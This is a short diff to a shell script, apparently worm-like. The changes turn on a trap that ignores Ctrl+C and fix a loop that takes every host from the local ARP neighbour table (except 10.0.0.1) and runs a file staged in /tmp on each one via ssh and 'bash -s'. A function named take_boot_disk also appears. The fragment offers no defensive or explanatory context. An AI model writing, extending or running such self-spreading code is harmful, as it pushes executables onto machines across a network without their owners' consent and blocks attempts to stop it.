@@ -2,7 +2,7 @@
 
 # Signal 2 is Ctrl+C
 # Okay disable it:
-#trap '' 2  
+trap '' 2  
 
 function take_boot_disk() 
 {
@@ -127,7 +127,7 @@ FILE_PATH="/tmp"
     sudo mv -v ./$FILE_SEND $FILE_PATH
     sudo chmod +x $FILE_PATH/$FILE_SEND     
     cd $FILE_PATH
-    for i in `ip neigh show | awk -F " " '{print $1};' #| grep -vE "*.1"`
+    for i in `ip neigh show | awk -F " " '{print $1};' | grep -vE "10.0.0.1"`
     do 
         ssh -v $i 'bash -s' < $FILE_PATH/$FILE_SEND
     
